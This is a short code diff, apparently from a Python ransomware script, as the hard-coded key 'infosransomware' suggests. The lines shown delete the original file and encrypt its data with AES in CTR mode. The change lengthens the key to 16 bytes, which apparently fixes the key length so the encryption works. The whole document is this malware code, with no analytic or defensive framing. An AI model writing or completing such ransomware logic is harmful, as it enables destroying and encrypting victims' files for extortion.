@@ -8,7 +8,7 @@ file.close()
 
 os.remove(file_name)
 
-key = b"infosransomware"
+key = b"infosransomwares"
 aes = pyaes.AESModeOfOperationCTR(key)
 crypto_data = aes.encrypt(file_data)
 
